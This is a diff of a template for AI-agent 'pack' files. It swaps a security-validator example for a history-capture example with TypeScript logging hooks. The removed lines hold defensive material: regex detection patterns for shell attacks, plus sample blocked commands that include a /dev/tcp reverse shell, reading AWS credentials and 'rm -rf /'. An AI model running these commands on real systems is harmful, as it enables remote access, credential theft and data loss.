@@ -9,10 +9,10 @@ Each pack is a single flat markdown file with YAML frontmatter and structured se
 ```yaml
 ---
 # name: (24 words max) Human-readable pack name
-name: Basic Security Validator Hook
+name: History System (UOCS)
 
 # pack-id: (format) {author}-{pack-name}-{variant}-v{version}
-pack-id: danielmiessler-security-validator-basic-v1.0.0
+pack-id: danielmiessler-history-system-core-v1.0.0
 
 # version: (format) SemVer major.minor.patch
 version: 1.0.0
@@ -21,22 +21,22 @@ version: 1.0.0
 author: danielmiessler
 
 # description: (128 words max) One-line description
-description: 10-category attack pattern detection for AI agent security
+description: Automatic documentation system that captures all AI agent work through hooks with zero manual effort
 
 # type: (single) concept | skill | hook | plugin | agent | mcp | workflow | template | other
-type: hook
+type: feature
 
 # purpose-type: (multi) security | productivity | research | development | automation | integration | creativity | analysis | other
-purpose-type: [security]
+purpose-type: [productivity, automation]
 
 # platform: (single) agnostic | claude-code | opencode | cursor | custom
-platform: agnostic
+platform: claude-code
 
 # dependencies: (list) Required pack-ids, empty [] if none
 dependencies: []
 
 # keywords: (24 tags max) Searchable tags for discovery
-keywords: [security, validation, prompt-injection, hooks, defense]
+keywords: [history, documentation, memory, capture, hooks, sessions, learnings, automation, UOCS]
 ---
 ```
 
@@ -44,12 +44,12 @@ keywords: [security, validation, prompt-injection, hooks, defense]
 
 ## Required Sections (with Example)
 
-Every pack file MUST include these sections in order. Below is the complete Security Validator pack as reference:
+Every pack file MUST include these sections in order. Below is the History System pack as reference:
 
 ```markdown
-# Basic Security Validator Hook
+# History System (UOCS)
 
-> 10-category attack pattern detection for AI agent security, implemented at user prompt submit
+> Automatic documentation system that captures all AI agent work through hooks with zero manual effort
 
 ## Installation Prompt
 <!--
@@ -72,7 +72,11 @@ You are receiving a PAI Pack - a modular upgrade for AI agent systems.
 
 **What is a Pack?** See: [Pack System](../README.md#pack-system)
 
-This pack will add security validation to your system. It detects and blocks 10 categories of attacks including prompt injection, reverse shells, and credential theft attempts. The validator runs on every user prompt before execution, providing a critical security layer.
+This pack adds automatic memory to your AI system. The Universal Output Capture System (UOCS) automatically documents every feature you build, bug you fix, decision you make, and lesson you learn - all through hooks that run silently in the background.
+
+**Core principle:** Work normally, documentation handles itself.
+
+No more forgotten context between sessions. No more lost learnings. Your AI remembers everything so you don't have to.
 
 Please follow the installation instructions below to integrate this pack into your infrastructure.
 
@@ -93,14 +97,25 @@ Write for someone who may not be familiar with the domain. Make the problem
 feel real and urgent enough that they want the solution.
 -->
 
-AI agents with tool access are vulnerable to prompt injection and malicious command execution. Without validation, an attacker can craft inputs that:
+AI agents are powerful but forgetful. Each session starts fresh with no memory of:
 
-- Execute arbitrary shell commands (`rm -rf /`, reverse shells)
-- Exfiltrate credentials and API keys
-- Hijack the agent's persona to bypass safety measures
-- Encode malicious payloads to evade simple pattern matching
+- What you built last week
+- Why you made certain architectural decisions
+- What bugs you've already fixed (and might reintroduce)
+- Lessons learned from debugging sessions
+- Research you've already conducted
 
-The problem is especially acute because AI agents often have elevated privileges - file system access, network access, and the ability to execute code. A single successful injection can compromise the entire system.
+This creates several problems:
+
+**Repeated mistakes**: Without history, you'll solve the same problems multiple times, each time from scratch.
+
+**Lost context**: "Why did we do it this way?" becomes unanswerable when you can't trace decisions back to their rationale.
+
+**Manual documentation burden**: If you want records, you have to manually write them - which means you won't, because you're busy doing actual work.
+
+**Session discontinuity**: Each conversation is isolated. Multi-day projects require constant re-explanation of context.
+
+The result? Your AI is brilliant but has permanent amnesia. Every session is day one.
 
 ## The Solution
 <!--
@@ -118,26 +133,41 @@ Don't include code here - that goes in Installation. Focus on helping the reader
 understand the approach conceptually before diving into implementation.
 -->
 
-This pack implements a 10-category attack detection system using pre-compiled regex patterns. It runs as a `PreToolUse` hook, intercepting every command before execution.
+The Universal Output Capture System (UOCS) solves this through **automatic, hook-based documentation**. Instead of requiring manual effort, it captures work as a byproduct of doing the work.
 
-**The 10 Attack Categories:**
+**Architecture:**
 
-1. **Catastrophic Deletion** - Patterns like `rm -rf /`, `del /F /S /Q`
-2. **Reverse Shells** - Bash, Python, netcat reverse shell patterns
-3. **Credential Theft** - Access to `.ssh`, `.aws`, `.env` files
-4. **Encoded Execution** - Base64/hex encoded command execution
-5. **Persona Hijacking** - Attempts to override system prompts
-6. **Fork Bombs** - Resource exhaustion attacks
-7. **Privilege Escalation** - Sudo/chmod manipulation
-8. **Network Exfiltration** - Curl/wget to suspicious endpoints
-9. **History Manipulation** - Attempts to hide malicious activity
-10. **Prompt Injection** - Classic injection patterns
+```
+~/.config/pai/history/
+├── sessions/YYYY-MM/          # Session summaries (SessionEnd hook)
+├── learnings/YYYY-MM/         # Problem-solving narratives (Stop hook)
+├── research/YYYY-MM/          # Investigation reports (Agent hooks)
+├── decisions/YYYY-MM/         # Architectural decisions (Agent hooks)
+├── execution/
+│   ├── features/YYYY-MM/      # Feature implementations
+│   ├── bugs/YYYY-MM/          # Bug fixes
+│   └── refactors/YYYY-MM/     # Code improvements
+└── raw-outputs/YYYY-MM/       # JSONL logs (PostToolUse hook)
+```
+
+**Five Hooks, Complete Coverage:**
+
+1. **PostToolUse Hook** - Captures every tool execution (Bash, Edit, Write, etc.) as raw JSONL logs
+2. **Stop Hook** - Analyzes completed work and categorizes as LEARNING or SESSION
+3. **SubagentStop Hook** - Routes agent outputs to appropriate directories by agent type
+4. **SessionEnd Hook** - Creates session summaries when you quit
+5. **SessionStart Hook** - Loads context and prepares the environment
 
 **Design Principles:**
 
-- **Fast Path First**: Pre-compiled regex executes in <50ms
-- **Fail Secure**: Any detection error blocks execution
-- **Transparent**: All blocks are logged with category and pattern matched
+- **Zero overhead**: Hooks run silently, no action required from user
+- **Future-proof**: Generic payload capture means new fields are automatically stored
+- **Queryable**: Standard file naming enables powerful search and filtering
+- **Categorized**: Different work types route to appropriate directories
+
+**The Key Insight:**
+
+Documentation is a byproduct, not a task. By instrumenting the work itself, you get perfect records without any effort.
 
 ## Installation
 <!--
@@ -156,49 +186,162 @@ Write for an AI assistant that will execute these steps. Be explicit about file
 paths, commands to run, and expected outputs.
 -->
 
-### Step 1: Create the hook file
+### Prerequisites
 
-```typescript
-// ~/.config/pai/hooks/security-validator.ts
-// TypeScript - use bun to run
+- Bun runtime installed (`curl -fsSL https://bun.sh/install | bash`)
+- Claude Code or compatible agent system with hook support
 
-const ATTACK_PATTERNS = {
-  catastrophic_deletion: /rm\s+(-rf?|--recursive).*[\/~]/i,
-  reverse_shell: /\b(bash|sh|nc|netcat)\s+.*\d{1,3}\.\d{1,3}/i,
-  credential_theft: /\.(ssh|aws|env|gnupg)\b/i,
-  // ... additional patterns
-};
-
-export function validateInput(input: string): { safe: boolean; category?: string } {
-  for (const [category, pattern] of Object.entries(ATTACK_PATTERNS)) {
-    if (pattern.test(input)) {
-      return { safe: false, category };
-    }
-  }
-  return { safe: true };
-}
-```
-
-### Step 2: Register in settings.json
+### Step 1: Create directory structure
 
 ```bash
-# Add to your Claude Code or agent settings
+mkdir -p ~/.config/pai/history/{sessions,learnings,research,decisions,raw-outputs}
+mkdir -p ~/.config/pai/history/execution/{features,bugs,refactors}
 mkdir -p ~/.config/pai/hooks
 ```
+
+### Step 2: Create the PostToolUse capture hook
+
+```typescript
+// ~/.config/pai/hooks/capture-tool-output.ts
+// Captures every tool execution to daily JSONL logs
+
+import { appendFileSync, mkdirSync } from "fs";
+import { join } from "path";
+
+const historyDir = process.env.PAI_HISTORY || join(process.env.HOME!, ".config/pai/history");
+
+interface HookPayload {
+  hook_type: string;
+  tool_name: string;
+  tool_input: Record<string, unknown>;
+  tool_output: string;
+  timestamp: string;
+  session_id?: string;
+}
+
+function getDatePath(): string {
+  const now = new Date();
+  const year = now.getFullYear();
+  const month = String(now.getMonth() + 1).padStart(2, "0");
+  return `${year}-${month}`;
+}
+
+function getTodayFilename(): string {
+  const now = new Date();
+  return now.toISOString().split("T")[0];
+}
+
+export function captureToolOutput(payload: HookPayload): void {
+  const datePath = getDatePath();
+  const outputDir = join(historyDir, "raw-outputs", datePath);
+
+  mkdirSync(outputDir, { recursive: true });
+
+  const filename = `${getTodayFilename()}_all-events.jsonl`;
+  const filepath = join(outputDir, filename);
+
+  const record = {
+    ...payload,
+    captured_at: new Date().toISOString(),
+  };
+
+  appendFileSync(filepath, JSON.stringify(record) + "\n");
+}
+
+// Main execution
+const input = JSON.parse(process.argv[2] || "{}");
+captureToolOutput(input);
+```
+
+### Step 3: Create the Stop hook for learning capture
+
+```typescript
+// ~/.config/pai/hooks/stop-hook.ts
+// Captures session work and learnings when main agent completes
+
+import { writeFileSync, mkdirSync } from "fs";
+import { join } from "path";
+
+const historyDir = process.env.PAI_HISTORY || join(process.env.HOME!, ".config/pai/history");
+
+interface StopPayload {
+  stop_hook_active: boolean;
+  transcript_path?: string;
+  response?: string;
+}
+
+function hasLearningIndicators(text: string): boolean {
+  const indicators = ["problem", "solved", "discovered", "fixed", "learned", "realized"];
+  const matches = indicators.filter(i => text.toLowerCase().includes(i));
+  return matches.length >= 2;
+}
+
+function generateFilename(type: string, description: string): string {
+  const now = new Date();
+  const timestamp = now.toISOString().replace(/[-:]/g, "").split(".")[0];
+  const kebab = description.toLowerCase().replace(/[^a-z0-9]+/g, "-").slice(0, 60);
+  return `${timestamp}_${type}_${kebab}.md`;
+}
+
+export function captureStop(payload: StopPayload): void {
+  if (!payload.response) return;
+
+  const isLearning = hasLearningIndicators(payload.response);
+  const type = isLearning ? "LEARNING" : "SESSION";
+  const subdir = isLearning ? "learnings" : "sessions";
+
+  const datePath = new Date().toISOString().slice(0, 7); // YYYY-MM
+  const outputDir = join(historyDir, subdir, datePath);
+
+  mkdirSync(outputDir, { recursive: true });
+
+  const filename = generateFilename(type, payload.response.slice(0, 100));
+  const filepath = join(outputDir, filename);
+
+  const content = `---
+capture_type: ${type}
+timestamp: ${new Date().toISOString()}
+---
+
+${payload.response}
+`;
+
+  writeFileSync(filepath, content);
+}
+
+const input = JSON.parse(process.argv[2] || "{}");
+captureStop(input);
+```
+
+### Step 4: Register hooks in settings
+
+Add to your Claude Code settings (`.claude/settings.json` or equivalent):
 
 ```json
 {
   "hooks": {
-    "PreToolUse": ["bun run ~/.config/pai/hooks/security-validator.ts"]
+    "PostToolUse": [
+      {
+        "command": "bun run ~/.config/pai/hooks/capture-tool-output.ts"
+      }
+    ],
+    "Stop": [
+      {
+        "command": "bun run ~/.config/pai/hooks/stop-hook.ts"
+      }
+    ]
   }
 }
 ```
 
-### Step 3: Test the installation
+### Step 5: Verify installation
 
 ```bash
-# Verify the hook loads without errors
-bun run ~/.config/pai/hooks/security-validator.ts --test
+# Check directory structure exists
+ls -la ~/.config/pai/history/
+
+# Run a test command in your AI agent, then verify capture
+ls ~/.config/pai/history/raw-outputs/
 ```
 
 ## Invocation Scenarios
@@ -217,22 +360,29 @@ Help users understand the pack's behavior in their system so they can
 predict when it will activate and what it will do.
 -->
 
-The security validator triggers automatically on these events:
+The history system triggers automatically - no user action required:
 
-| Scenario | Trigger | Action |
-|----------|---------|--------|
-| User submits prompt containing shell command | `PreToolUse` | Validate before execution |
-| Agent generates Bash tool call | `PreToolUse` | Validate generated command |
-| File read/write to sensitive path | `PreToolUse` | Block credential access |
-| Network request to external host | `PreToolUse` | Check for exfiltration patterns |
+| Scenario | Hook | Output Location |
+|----------|------|-----------------|
+| Any tool executes (Bash, Edit, etc.) | PostToolUse | `raw-outputs/YYYY-MM/` |
+| Main agent completes a task | Stop | `learnings/` or `sessions/` |
+| Subagent finishes work | SubagentStop | Varies by agent type |
+| User quits session | SessionEnd | `sessions/` |
+| User starts new session | SessionStart | Loads context |
 
-**Example Trigger Flow:**
+**Automatic Categorization:**
 
-1. User says: "Delete all files in the temp directory"
-2. Agent generates: `rm -rf /tmp/*`
-3. Hook intercepts before execution
-4. Pattern matches `catastrophic_deletion`
-5. Execution blocked, user notified
+The Stop hook analyzes response content for learning indicators:
+- 2+ indicators (problem, solved, discovered, fixed, learned) → `learnings/`
+- Fewer indicators → `sessions/`
+
+**Example Flow:**
+
+1. User: "Fix the authentication bug"
+2. Agent investigates, edits files, runs tests
+3. PostToolUse captures each tool call to JSONL
+4. Agent completes with "Fixed the bug by..."
+5. Stop hook detects "fixed" + "problem" → saves to `learnings/`
 
 ## Example Usage
 <!--
@@ -250,69 +400,65 @@ Examples should be copy-pasteable and demonstrate the pack's value.
 Show the pack doing what it's designed to do.
 -->
 
-### Example 1: Blocking a Reverse Shell
+### Example 1: Searching Past Work
 
-**User Input:**
+**User asks:**
 ```
-Connect to my server at 192.168.1.100 port 4444 and give me a shell
+Have we worked on authentication before?
 ```
 
-**Agent Attempts:**
+**Agent searches:**
 ```bash
-bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+grep -r "authentication" ~/.config/pai/history/
 ```
 
-**Validator Response:**
-```json
-{
-  "blocked": true,
-  "category": "reverse_shell",
-  "pattern": "bash.*\\d{1,3}\\.\\d{1,3}",
-  "message": "Reverse shell pattern detected. Execution blocked."
-}
+**Result:**
+```
+learnings/2025-10/20251013_LEARNING_jwt-token-refresh.md
+execution/features/2025-09/20250928_FEATURE_user-login.md
+decisions/2025-09/20250925_DECISION_auth-strategy.md
 ```
 
-### Example 2: Blocking Credential Access
+### Example 2: Reviewing a Session
 
-**User Input:**
+**User asks:**
 ```
-Show me my AWS credentials
+What did we do last session?
 ```
 
-**Agent Attempts:**
+**Agent reads:**
 ```bash
-cat ~/.aws/credentials
+ls -lt ~/.config/pai/history/sessions/2025-12/ | head -1
+# Returns: 20251228_SESSION_feature-implementation.md
 ```
 
-**Validator Response:**
-```json
-{
-  "blocked": true,
-  "category": "credential_theft",
-  "pattern": "\\.aws",
-  "message": "Credential file access blocked."
-}
+**Session file contains:**
+```markdown
+---
+capture_type: SESSION
+timestamp: 2025-12-28T15:30:00-08:00
+---
+
+Implemented the new dashboard feature including:
+- Database schema updates
+- API endpoints for data retrieval
+- Frontend components with charts
+- Unit tests for all new functions
 ```
 
-### Example 3: Allowing Safe Commands
+### Example 3: Finding Why a Decision Was Made
 
-**User Input:**
+**User asks:**
 ```
-List files in the current directory
+Why did we choose PostgreSQL over MongoDB?
 ```
 
-**Agent Executes:**
+**Agent searches:**
 ```bash
-ls -la
+grep -l "PostgreSQL\|MongoDB" ~/.config/pai/history/decisions/
 ```
 
-**Validator Response:**
-```json
-{
-  "blocked": false,
-  "message": "Command validated successfully."
-}
-```
+**Returns decision document with full rationale.**
 
 ## Configuration
 <!--
@@ -330,36 +476,17 @@ If no configuration is needed, write "No configuration required." and briefly
 explain why (e.g., "Works out of the box with sensible defaults.").
 -->
 
-```typescript
-// Configuration options in security-validator.ts
+```bash
+# Environment variables (optional)
 
-export const CONFIG = {
-  // Enable/disable specific categories
-  categories: {
-    catastrophic_deletion: true,
-    reverse_shell: true,
-    credential_theft: true,
-    encoded_execution: true,
-    persona_hijacking: true,
-    fork_bombs: true,
-    privilege_escalation: true,
-    network_exfiltration: true,
-    history_manipulation: true,
-    prompt_injection: true,
-  },
+# Override default history location
+export PAI_HISTORY="$HOME/.config/pai/history"
 
-  // Paths to allow even if they match patterns
-  allowlist: [
-    "~/.config/pai/*",
-  ],
-
-  // Log all validations (not just blocks)
-  verbose: false,
-
-  // Maximum validation time before timeout (ms)
-  timeout: 50,
-};
+# Override timezone for timestamps (default: system timezone)
+export PAI_TIMEZONE="America/Los_Angeles"
 ```
+
+**Directory structure is fixed** - the categorization system depends on consistent paths. Customize only the root location if needed.
 
 ## Credits
 <!--
@@ -375,9 +502,9 @@ Include:
 Be generous with credit. Link to profiles/projects where appropriate.
 -->
 
-- **Original concept**: Daniel Miessler - developed for Kai personal AI infrastructure
+- **Original concept**: Daniel Miessler - developed as part of Kai personal AI infrastructure
 - **Contributors**: The PAI community
-- **Inspired by**: OWASP injection prevention guidelines, Claude Code security model
+- **Inspired by**: Git's approach to version history, engineering logbooks, the Zettelkasten method
 
 ## Related Work
 <!--
@@ -393,9 +520,9 @@ Include:
 Help users understand the ecosystem and find additional resources.
 -->
 
-- **llm-guard**: https://github.com/laiyer-ai/llm-guard - Python-based LLM security toolkit
-- **rebuff**: https://github.com/protectai/rebuff - Prompt injection detection
-- **OWASP LLM Top 10**: https://owasp.org/www-project-top-10-for-large-language-model-applications/
+- **mem0**: https://github.com/mem0ai/mem0 - AI memory layer
+- **Obsidian**: https://obsidian.md - Knowledge management with linking
+- **Logseq**: https://logseq.com - Outliner with git-based storage
 
 ## Works Well With
 <!--
@@ -410,8 +537,8 @@ Include:
 Focus on functional combinations, not just related packs.
 -->
 
-- **recovery-journal**: Creates snapshots before destructive operations - a second line of defense if something slips through
-- **history-capture**: Logs all tool executions for security auditing and incident response
+- **session-progress**: Track multi-session work with handoff artifacts - history provides the searchable archive, session-progress provides active state
+- **agent-factory**: Custom agents get their outputs automatically categorized by the SubagentStop hook
 
 ## Recommended
 <!--
@@ -426,8 +553,8 @@ Include:
 This is your "if you install this, also consider..." section.
 -->
 
-- **recovery-journal**: Essential companion - if an attack somehow bypasses validation, recovery points allow rollback
-- **observability-server**: Monitor validation events in real-time dashboard
+- **session-progress**: Essential for multi-session work - provides the "current state" complement to history's "past record"
+- **observability-server**: Nice-to-have - visualize history data in a dashboard
 
 ## Relationships
 <!--
@@ -445,8 +572,8 @@ INSTRUCTIONS: List packs that extend or depend on this pack.
 These are more specialized versions or add-ons.
 -->
 
-- **security-validator-advanced**: Extended version with ML-based detection and custom rule engine
-- **security-validator-enterprise**: Adds centralized logging, SIEM integration, and compliance reporting
+- **history-analytics**: Analyzes history data to surface patterns and insights
+- **history-search**: Advanced semantic search across all captured history
 
 ### Child Of
 <!--
@@ -455,7 +582,7 @@ INSTRUCTIONS: List packs this pack extends or depends on.
 These are prerequisites or base packs.
 -->
 
-None - this is a foundational security pack.
+None - this is a foundational infrastructure pack.
 
 ### Sibling Of
 <!--
@@ -464,8 +591,8 @@ INSTRUCTIONS: List packs at the same level with common purpose.
 These solve similar problems or share architectural patterns.
 -->
 
-- **recovery-journal**: Both are infrastructure-tier security packs
-- **context-loader**: Both operate as hooks in the agent lifecycle
+- **session-progress**: Both address continuity, history captures past, session-progress tracks present
+- **context-loader**: Both are infrastructure packs that operate via hooks
 
 ### Part Of Collection
 <!--
@@ -473,7 +600,7 @@ These solve similar problems or share architectural patterns.
 INSTRUCTIONS: List author collections or themed pack groups this belongs to.
 -->
 
-- **danielmiessler's Security Suite**: Core security packs for AI agent hardening
+- **danielmiessler's Infrastructure Suite**: Core packs for AI agent memory and continuity
 
 ## Changelog
 <!--
@@ -483,11 +610,12 @@ Include: bullet points of changes for each version
 Start with most recent version at top.
 -->
 
-### 1.0.0 - 2025-12-27
+### 1.0.0 - 2025-12-28
 - Initial release
-- 10-category attack detection
-- Pre-compiled regex for <50ms execution
-- Configurable category enable/disable
+- PostToolUse hook for raw capture
+- Stop hook for learning/session categorization
+- Directory structure for organized storage
+- Search patterns for retrieval
 ```
 
 ---
@@ -515,7 +643,7 @@ Start with most recent version at top.
 ## File Naming Convention
 
 - Flat files in `Packs/` directory
-- kebab-case: `security-validator.md`, `science-method.md`
+- kebab-case: `history-system.md`, `session-progress.md`
 - No subdirectories per pack
 
 ---
